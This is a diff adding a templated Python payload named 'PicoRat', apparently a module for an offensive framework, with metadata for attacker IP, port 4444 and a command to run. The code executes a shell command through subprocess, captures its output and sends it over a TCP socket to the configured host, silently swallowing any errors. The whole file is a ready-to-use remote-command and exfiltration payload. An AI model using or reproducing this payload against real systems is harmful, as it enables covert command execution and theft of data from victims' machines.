@@ -1,0 +1,21 @@
+#!name##PicoRat
+#!types##payload
+#!info##A simple python script. Executes a command and one attempt to send a response via socket tcp. You can use in shellcode.
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##PR_port##Host port##int
+#!setVar##PR_port##4444##int
+#!reqVar##PR_cmd##Command to be executed by Subprocess##str
+#!setVar##PR_cmd##uname -r##str
+#!import_FLAG##True
+#!render_FLAG##True
+import socket as s
+import subprocess as c
+try:
+    o = c.run("{{PR_cmd}}", shell=True, capture_output=True)
+    p = o.stderr + o.stdout
+    soc = s.socket(s.AF_INET, s.SOCK_STREAM)
+    soc.connect(("{{IP_ADDR}}",{{PR_port}}))
+    soc.sendall(p)
+    soc.close()
+except:
+    pass
